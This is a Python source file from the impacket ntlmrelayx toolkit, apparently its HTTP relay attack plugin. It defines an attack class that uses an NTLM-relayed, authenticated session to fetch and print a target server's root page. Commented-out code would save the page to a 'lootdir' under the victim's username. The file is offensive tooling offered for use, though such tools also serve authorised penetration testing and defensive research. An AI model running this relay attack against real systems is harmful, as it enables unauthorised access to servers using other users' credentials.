# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  HTTP protocol relay attack
#
# ToDo:
#
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

PROTOCOL_ATTACK_CLASS = "HTTPAttack"

class HTTPAttack(ProtocolAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):
        #Default action: Dump requested page to file, named username-targetname.html

        #You can also request any page on the server via self.client.session,
        #for example with:
        result = self.client.request("GET", "/")
        r1 = self.client.getresponse()
        print r1.status, r1.reason
        data1 = r1.read()
        print data1

        #Remove protocol from target name
        #safeTargetName = self.client.target.replace('http://','').replace('https://','')

        #Replace any special chars in the target name
        #safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)

        #Combine username with filename
        #fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'

        #Write it to the file
        #with open(os.path.join(self.config.lootdir,fileName),'w') as of:
        #    of.write(self.client.lastresult)
